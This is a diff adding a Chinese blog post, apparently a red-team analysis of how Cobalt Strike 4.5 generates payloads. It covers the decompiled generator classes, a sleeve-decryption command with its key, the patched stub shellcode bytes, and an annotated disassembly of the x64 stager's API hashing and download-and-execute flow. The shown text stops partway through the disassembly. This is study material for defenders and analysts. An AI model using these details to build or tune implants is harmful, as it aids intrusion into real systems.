@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2026/11/15/cs-shellcode/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2026/11/15/cs-shellcode/","path":"2026/11/15/cs-shellcode/","title":"CS4.5 生成流程与shellcode简记"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CS4.5 生成流程与shellcode简记 | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-threat-blog"><a href="/Threat-Blog/" rel="section"><i class="fa fa-star fa-fw"></i>Threat-Blog</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E7%B1%BB%E5%9E%8B"><span class="nav-text">生成类型</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Payload-Generator"><span class="nav-text">Payload Generator</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-Executable"><span class="nav-text">Windows Executable</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-Stageless"><span class="nav-text">Windows Stageless</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#patch-beacon"><span class="nav-text">patch beacon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#patch-PE"><span class="nav-text">patch PE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows-pe-%E5%88%86%E6%9E%90"><span class="nav-text">Windows pe 分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Stager-shellcode-%E5%88%86%E6%9E%90"><span class="nav-text">Stager shellcode 分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A5%E5%8F%A3%E4%B8%8E%E6%A0%88%E5%AF%B9%E9%BD%90"><span class="nav-text">入口与栈对齐</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD-wininet-dll"><span class="nav-text">加载 wininet.dll</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90%E5%99%A8"><span class="nav-text">函数解析器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E5%A4%9A%E4%B8%AAhttp%E5%87%BD%E6%95%B0"><span class="nav-text">加载多个http函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E9%85%8D%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C"><span class="nav-text">分配内存执行</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Stage-stub-shellcode-%E5%88%86%E6%9E%90"><span class="nav-text">Stage stub shellcode 分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Stage-ReflectiveLoader-%E5%88%86%E6%9E%90"><span class="nav-text">Stage ReflectiveLoader 分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/11/15/cs-shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CS4.5 生成流程与shellcode简记 | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CS4.5 生成流程与shellcode简记
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-11-15 00:00:00" itemprop="dateCreated datePublished" datetime="2026-11-15T00:00:00+08:00">2026-11-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><!--more-->
+
+<h1 id="生成类型"><a href="#生成类型" class="headerlink" title="生成类型"></a>生成类型</h1><p>ida的java-decompiler.jar反编译CS4.5</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs&#x3D;true cobaltstrike.jar cs_src</span><br></pre></td></tr></table></figure>
+
+<p>CS的生成界面共有四套对应的代码，分别对应：</p>
+<ul>
+<li>windows stageless</li>
+<li>windows stager</li>
+<li>payload stager</li>
+<li>payload stageless（CS4.7引入）</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261103004617278.png" alt="image-20261103004617278"></p>
+<p>在GUI呈现如下：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261103004431330.png" alt="image-20261103004431330"></p>
+<p>各自作用：</p>
+<p>Payload Generator：生成各种类型的 stager shellcode，作用是通过网络拉取Stage并内存运行实现上线</p>
+<p>Windows Executable：生成windows下可以直接运行stager shellcode的PE文件，作用是通过网络拉取Stage并内存运行上线</p>
+<p>Windows Executable（Stageless）：生成windows下可以直接运行Stage的PE文件，作用是直接上线</p>
+<h1 id="Payload-Generator"><a href="#Payload-Generator" class="headerlink" title="Payload Generator"></a>Payload Generator</h1><p>PayloadGeneratorDialog#dialogAction() 通过 <strong>ScListener#getPayloadStager()</strong> 获取stager</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107171833517.png" alt="image-20261107171833517"></p>
+<p>stager的生成最终会通过 <strong>GenericHTTPStager#generate()</strong> </p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107172611300.png" alt="image-20261107172611300"></p>
+<p>stager 模板文件有五种</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107173222208.png" alt="image-20261107173222208"></p>
+<p>stager是一段shellcode模板，即常见的 fc48</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261109001629909.png" alt="image-20261109001629909"></p>
+<p>然后会根据listener配置按照固定偏移量、替换占位符来patch stager模板文件，这里我使用默认的C2Profile就会随机生成UA、URI，生成针对特定listener的 stager</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107180147825.png" alt="image-20261107180147825"></p>
+<p>最后根据选择生成的类型将stager变形为对应的输出类型</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107180940024.png" alt="image-20261107180940024"></p>
+<h1 id="Windows-Executable"><a href="#Windows-Executable" class="headerlink" title="Windows Executable"></a>Windows Executable</h1><p>获取stager步骤同Payload</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107190435769.png" alt="image-20261107190435769"></p>
+<p>为了将PE和stager结合，通过 <strong>BaseArtifactUtils#patchArtifact()</strong> 函数，对 <code>artifact</code> 系列PE进行patch</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107193110109.png" alt="image-20261107193110109"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107190606487.png" alt="image-20261107190606487"></p>
+<p>直接将stager异或加密，然后构造如下结构，替换 <code>artifact</code> pe文件的A占位符，完成生成</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+0	 stager 绝对偏移</span><br><span class="line">+4	 原始 stager 长度</span><br><span class="line">+8	 4 字节异或密钥</span><br><span class="line">+12	 GetModuleHandleA hint</span><br><span class="line">+16	 GetProcAddress hint</span><br><span class="line">+20	 加密stager</span><br><span class="line">...	 (trial) EICAR 字符串</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107192637458.png" alt="image-20261107192637458"></p>
+<h1 id="Windows-Stageless"><a href="#Windows-Stageless" class="headerlink" title="Windows Stageless"></a>Windows Stageless</h1><p>可简单分为两步：</p>
+<ul>
+<li>patch stub引导头、C2Profile 配置信息到beacon模板中形成 Stage</li>
+<li> patch Stage到exe中</li>
+</ul>
+<h2 id="patch-beacon"><a href="#patch-beacon" class="headerlink" title="patch beacon"></a>patch beacon</h2><p><strong>ScListener#export()</strong> 函数会根据payload选择处理不同的DLL，这里跟进HTTP类型</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107195204061.png" alt="image-20261107195204061"></p>
+<p><strong>BeaconPayload#exportBeaconStageHTTP()</strong> 除了支持UDRL外还有两个重要函数</p>
+<ul>
+<li>BeaconPayload#exportBeaconStage()：patch beacon中关于 C2Profile 配置信息</li>
+<li>MalleablePE#process()：patch beacon中关于 stub shellcode引导头、ReflectiveLoader函数字节等</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107200358653.png" alt="image-20261107200358653"></p>
+<hr>
+<p>一、<strong>BeaconPayload#exportBeaconStage()</strong></p>
+<p>对于 <code>sleeve/</code> 目录下的文件，都是被加密过的（包括beacon、pivot等核心dll、obj文件），解密需要指定密钥</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python beacon_decrypto.py beacon.x64.dll -s f38eb3d1a335b252b58bc2acde81b542 -o beacon64.dll</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107220910893.png" alt="image-20261107220910893"></p>
+<p>构建 TLV（Type-Length-Value）结构，将C2Profile的配置填入，包括不限于</p>
+<ul>
+<li>通信相关：服务器地址、端口、URI、User-Agent、Host头等</li>
+<li>行为控制：Beacon 类型、睡眠时间、抖动比例、终止日期等</li>
+<li>后渗透与进程：派生进程的路径、SMB 管道名、进程注入等</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107221856808.png" alt="image-20261107221856808"></p>
+<p>将整个TLV配置块与 0x2E（46）进行XOR异或，然后替换占位符</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107221945720.png" alt="image-20261107221945720"></p>
+<hr>
+<p>二、<strong>MalleablePE#process()</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107232829587.png" alt="image-20261107232829587"></p>
+<p><strong>PEParser#load()</strong>: 解析PE信息</p>
+<p><strong>ReflectiveDLL#getReflectiveLoaderInfo()</strong>: 通过导出表找到指定导出函数 <code>ReflectiveLoader</code> 偏移，利用指定特征符 <code>CC 90 ..</code> 再次定位偏移量并计算模板填充长度，返回一个信息对象</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261107234021695.png" alt="image-20261107234021695"></p>
+<p>此时的 ReflectiveLoader 函数还是一片占位符，且偏移量是 0x16444</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108000354941.png" alt="image-20261108000354941"></p>
+<p><strong>MalleablePE#pre_process()</strong>: 通过一个PEEditor对象，对模板beacon.x64.dll进行 PE 层面定制化修改，从C2Profile 的 stage 块中读取各项配置，然后将这些配置应用从而改变其静态与内存特征以规避检测</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108001648463.png" alt="image-20261108001648463"></p>
+<p>例如 setRWXHint() 通过修改PE头信息中的 Characteristic 的 32768（0x8000，IMAGE_FILE_SYSTEM 标志位）信息，借用合法的标志位向ReflectiveLoader提供某些配置信号</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108002351059.png" alt="image-20261108002351059"></p>
+<p><strong>MalleablePE#post_process</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108003649071.png" alt="image-20261108003649071"></p>
+<p><strong>BeaconRDLL#process()</strong> 主要功能是</p>
+<ol>
+<li> 获取stub并patch到DOS头中</li>
+<li> 获取真正的ReflectiveLoader函数并patch到导出的偏移处</li>
+</ol>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108005412636.png" alt="image-20261108005412636"></p>
+<p><strong>BeaconLoader#getDOSHeaderPatchX64()</strong> 获取一个stub shellcode</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108010412121.png" alt="image-20261108010412121"></p>
+<p>stub内容如下，其本质是一段可执行的shellcode</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[var0]</span><br><span class="line">55</span><br><span class="line">48 89 E5</span><br><span class="line">48 81 EC 20 00 00 00</span><br><span class="line">48 8D 1D [-18 - var0.length]</span><br><span class="line">48 89 DF</span><br><span class="line">48 81 C3 [var1]</span><br><span class="line">FF D3</span><br><span class="line">41 B8 [var2]</span><br><span class="line">68 04 00 00 00</span><br><span class="line">5A</span><br><span class="line">48 89 F9</span><br><span class="line">FF D0</span><br><span class="line"></span><br><span class="line">其中具体的信息为:</span><br><span class="line">var0 &#x3D; 4d 5a 41 52 &#x3D; &#39;MZAR&#39;		&#x2F;&#x2F; magic_mz_x64</span><br><span class="line">-18 - var0.length &#x3D; EA FF FF FF		&#x2F;&#x2F; magic_mz_x64长度</span><br><span class="line">var1 &#x3D; 44 64 01 00 &#x3D; 0x16444		&#x2F;&#x2F; ReflectiveLoader相对pe偏移量</span><br><span class="line">var2 &#x3D; F0 B5 A2 56 &#x3D; 1453503984		&#x2F;&#x2F; 固定值</span><br><span class="line"></span><br><span class="line">那么完整的stub shellcode就是:</span><br><span class="line">4d 5a 41 52</span><br><span class="line">55</span><br><span class="line">48 89 E5</span><br><span class="line">48 81 EC 20 00 00 00</span><br><span class="line">48 8D 1D EA FF FF FF</span><br><span class="line">48 89 DF</span><br><span class="line">48 81 C3 44 64 01 00</span><br><span class="line">FF D3</span><br><span class="line">41 B8 F0 B5 A2 56</span><br><span class="line">68 04 00 00 00</span><br><span class="line">5A</span><br><span class="line">48 89 F9</span><br><span class="line">FF D0</span><br></pre></td></tr></table></figure>
+
+<p><strong>BeaconRDLL#getReflectiveLoaderFunction()</strong> 获取不同的obj文件内容，里面是不同的方法实现的 ReflectiveLoader的具体函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108023018224.png" alt="image-20261108023018224"></p>
+<p>最后，将真正的ReflectiveLoader进行填充、将stub patch 到DOS头</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108025453789.png" alt="image-20261108025453789"></p>
+<p>至此一个包含可用的ReflectiveLoader函数的BeaconDLL（Stage）制作完成</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261108235630415.png" alt="image-20261108235630415"></p>
+<h2 id="patch-PE"><a href="#patch-PE" class="headerlink" title="patch PE"></a>patch PE</h2><p>如果导出类型选的RAW，那么直接将上面Stage写入beacon.bin，因为Dos头是一段stub shellcode，所以可以直接loader运行。</p>
+<p>如果选的是其他导出类型，为了将PE和Stage结合，依旧通过上面写过的 <strong>BaseArtifactUtils#patchArtifact()</strong> 函数，对 <code>artifactbig</code> 系列PE进行patch</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261109001038950.png" alt="image-20261109001038950"></p>
+<p>直接将Stage异或加密，然后构造如下结构，替换 <code>artifact</code> pe文件的A占位符，完成生成</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+0	 Stage 绝对偏移</span><br><span class="line">+4	 原始 Stage 长度</span><br><span class="line">+8	 4 字节异或密钥</span><br><span class="line">+12	 GetModuleHandleA hint</span><br><span class="line">+16	 GetProcAddress hint</span><br><span class="line">+20	 加密Stage</span><br><span class="line">...	 (trial) EICAR 字符串</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Windows-pe-分析"><a href="#Windows-pe-分析" class="headerlink" title="Windows pe 分析"></a>Windows pe 分析</h1><p>stager 和 stageless 的 pe模板的功能一样。只不过前者执行的是stager shellcode，后者执行的是stage开头部分的stub shellcode</p>
+<p>这里以 artifact64.exe 为例</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261114163603793.png" alt="image-20261114163603793"></p>
+<p>sub_402A60 是一个初始化作用， 将 MinGW/GCC 的 CRT 初始化，遍历 qword_4030D0 处的构造函数表并执行</p>
+<p>sub_401795 是真正运行stager shellcode的函数，构造一个pipe name：<code>\.\pipe\MSSE-5296-server</code></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261114163912138.png" alt="image-20261114163912138"></p>
+<p>创建线程执行 sub_401685 -&gt; shellcode_to_pipe，创建pipe，将加密的stager shellcode放到pipe中</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261114165904153.png" alt="image-20261114165904153"></p>
+<p>运行 sub_401742，malloc一块堆，将pipe放到堆</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261114170527588.png" alt="image-20261114170527588"></p>
+<p>VirtualAlloc RW + stager shellcode 解密 + VirtualProtect RX + CreateThread 创建线程 开始运行stager shellcode</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261114170838102.png" alt="image-20261114170838102"></p>
+<p>stager在.data中排布正如上面的排布结构</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261114171920637.png" alt="image-20261114171920637"></p>
+<h1 id="Stager-shellcode-分析"><a href="#Stager-shellcode-分析" class="headerlink" title="Stager shellcode 分析"></a>Stager shellcode 分析</h1><p>生成一段starger shellcode并使用loader加载dbg</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">入口(cld&#x2F;对齐) → call 取基址</span><br><span class="line">  → PEB 遍历 → kernel32 基址</span><br><span class="line">  → 导出表遍历 + ROR13 哈希</span><br><span class="line">  → 逐个解析并调用：LoadLibraryA&#x2F;GetProcAddress&#x2F;...</span><br><span class="line">  → LoadLibraryA(&quot;wininet&quot;)</span><br><span class="line">  → InternetOpenA → InternetConnectA(IP, 8080)</span><br><span class="line">  → HttpOpenRequestA → HttpSendRequestA(User-Agent)</span><br><span class="line">  → VirtualAlloc(0x400000, RWX)</span><br><span class="line">  → InternetReadFile 循环写入 Beacon</span><br><span class="line">  → ret&#x2F;jmp 到缓冲区执行</span><br></pre></td></tr></table></figure>
+
+<h2 id="入口与栈对齐"><a href="#入口与栈对齐" class="headerlink" title="入口与栈对齐"></a>入口与栈对齐</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FC               cld               ; 清DF方向标志，控制串操作指令，从内存从低地址往高地址依次读取字符</span><br><span class="line">48 83 E4 F0      and rsp, -0x10    ; 栈 16 字节对齐，rsp低4位置0（x64 ABI 要求）</span><br><span class="line">E8 C8 00 00 00   call loc_+0xC8    ; call&#x2F;pop 取基址，返回地址压栈</span><br></pre></td></tr></table></figure>
+
+<p>call将下一条指令地址压栈，并通过指定偏移运行pop rbp，获取当前基址</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261115182202775.png" alt="image-20261115182202775"></p>
+<h2 id="加载-wininet-dll"><a href="#加载-wininet-dll" class="headerlink" title="加载 wininet.dll"></a>加载 wininet.dll</h2><p>字符串入栈</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00D3  6A 00                 push 0                      ; 字符串结尾 0</span><br><span class="line">00D5  49:BE 77696E696E657400  mov r14, &quot;wininet\0&quot;      ; 立即数装入 r14</span><br><span class="line">00DF  41:56                 push r14                    ; 压入 &quot;wininet\0&quot;</span><br><span class="line">00E1  49:89E6               mov r14, rsp                ; r14 &#x3D; 指向 &quot;wininet&quot;</span><br><span class="line">00E4  4C:89F1               mov rcx, r14                ; rcx &#x3D; 第1参数 &#x3D; &quot;wininet&quot;</span><br><span class="line">00E7  41:BA 4C772607        mov r10d, 0x0726774C        ; LoadLibraryA 的 ROR13 哈希</span><br><span class="line">00ED  FFD5                  call rbp                    ; 调用 [rbp+哈希解析出的地址]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/cobalt-strike/image-20261115185033248.png" alt="image-20261115185033248"></p>
+<h2 id="函数解析器"><a href="#函数解析器" class="headerlink" title="函数解析器"></a>函数解析器</h2><p>rbp后面一段是 <strong>通过遍历PEB Ldr寻找模块并解析导出表通过ROT13比对函数hash</strong> 的shellcode，<strong>用于寻找指定函数并调用</strong>。会被多次调用。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r10d &#x3D; 要调用的 API ROR13 哈希</span><br><span class="line">r9	ROR13 哈希</span><br><span class="line">r8	存 AddressOfNames &#x2F; AddressOfFunctions 等 RVA</span><br><span class="line">rdx	&#x3D; 遍历 PEB、模块、导出表</span><br><span class="line">rcx	存 NumberOfNames、序号等循环变量</span><br><span class="line">rsi	指向函数名字符串 lodsb 会推进它</span><br></pre></td></tr></table></figure>
+
+<p>一、保护现场</p>
+<p>这段shellcode可以看作被多次调用的 <code>公用函数</code> ，不能破坏调用者的寄存器，所以要先进行备份</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000A  41:51     push r9</span><br><span class="line">000C  41:50     push r8</span><br><span class="line">000E  52        push rdx</span><br><span class="line">000F  51        push rcx</span><br><span class="line">0010  56        push rsi</span><br></pre></td></tr></table></figure>
+
+<p>二、找 PEB -&gt; Ldr -&gt; 模块链表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0011  48:31D2          xor rdx, rdx               ; rdx 清0</span><br><span class="line">0014  6548:8B52 60     mov rdx, gs:[rdx+0x60]     ; rdx &#x3D; PEB</span><br><span class="line">0019  48:8B52 18       mov rdx, [rdx+0x18]        ; rdx &#x3D; PEB-&gt;Ldr</span><br><span class="line">001D  48:8B52 20       mov rdx, [rdx+0x20]        ; rdx &#x3D; InMemoryOrderModuleList.Flink</span><br><span class="line">0021  48:8B72 50       mov rsi, [rdx+0x50]        ; rsi &#x3D; FullDllName.Buffer</span><br></pre></td></tr></table></figure>
+
+<p>三、对模块名算 ROR13 哈希</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0025  48:0FB74A 4A          movzx rcx, [rdx+0x4A]      ; rcx &#x3D; 模块名长度</span><br><span class="line">002A  4D:31C9               xor r9, r9                 ; r9 &#x3D; 哈希累加器 &#x3D; 0</span><br><span class="line">002D  48:31C0               xor rax, rax</span><br><span class="line">0030  AC                    lodsb                      ; al &#x3D; [rsi], rsi++</span><br><span class="line">0031  3C 61                 cmp al, 0x61               ; 是小写字母吗？</span><br><span class="line">0033  7C 02                 jl  +2                     ; 不是就跳过转大写</span><br><span class="line">0035  2C 20                 sub al, 0x20               ; 小写转大写</span><br><span class="line">0037  41:C1C9 0D            ror r9d, 0x0D              ; ror13</span><br><span class="line">003B  41:01C1               add r9d, eax               ; 累加</span><br><span class="line">003E  E2 ED                 loop 0x002D                ; rcx--，不为0就回 0x002D</span><br></pre></td></tr></table></figure>
+
